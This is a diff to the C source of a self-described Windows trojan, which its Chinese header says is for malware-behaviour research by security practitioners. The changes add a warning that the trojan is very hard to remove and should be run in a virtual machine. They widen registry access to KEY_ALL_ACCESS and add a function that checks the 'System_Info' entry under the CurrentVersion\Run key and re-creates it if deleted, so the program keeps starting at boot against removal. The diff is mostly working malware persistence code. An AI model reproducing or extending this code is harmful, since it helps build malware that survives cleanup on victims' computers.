@@ -17,7 +17,8 @@
 *否则子昂要退出进程只能先将注册表中开机自启设置关掉再重启
 *，另外还没有设计socket传输记录日志文件的功能，此程序为我
 *个人进行恶意程序行为分析研究使用，也仅供安全从业人员研究使用
-*，不得用于非法用途！
+*，注意此木马一旦种下相对而言极难难清除，请在虚拟机中运行，
+*此外不得用于非法用途！
 */
 
 //全局唯一的函数指针，此指针非线程安全
@@ -515,10 +516,11 @@ int GetAppCurrentDir
 }
 
 //写入注册表,设定开机自启
-int WriteRegedit
+int InitializeRegedit
 (
 	_In_ const	char* reg_path,
-	_In_ const char* value
+	_In_ const char* value,
+	_Inout_ HKEY* hk
 )
 {
 	HKEY hKey;
@@ -529,7 +531,7 @@ int WriteRegedit
 		0,
 		NULL,
 		REG_OPTION_NON_VOLATILE,
-		KEY_SET_VALUE,
+		KEY_ALL_ACCESS,
 		NULL,
 		&hKey,
 		&dw
@@ -555,10 +557,34 @@ int WriteRegedit
 	{
 		printf("Y %ld\n", ret);
 	}
-	RegCloseKey(hKey);
+	//RegCloseKey(hKey);
+	memcpy(hk, &hKey, sizeof(hKey));
 	return 0;
 }
 
+//验证注册表键值是否存在,不存在就新建防止注册表键值被删除
+void VerRegedit
+(
+	_In_ HKEY hKey,
+	_In_ const char* path
+)
+{
+	InitializeRegedit("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+		path,
+		&hKey);
+
+	DWORD lpType = REG_SZ;
+	DWORD dataLen = 500;
+	CHAR data[500] = { 0 };
+	long status = RegQueryValueEx(hKey, (LPCSTR)"System_Info", NULL, &lpType, (LPBYTE)data, &dataLen);
+	if (status != ERROR_SUCCESS)
+		InitializeRegedit("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+			path,
+			&hKey);
+	//RegCloseKey(hk);
+}
+
+//创建新进程
 int CreateNewProcess
 (
 	_In_ char* DIR_PATH
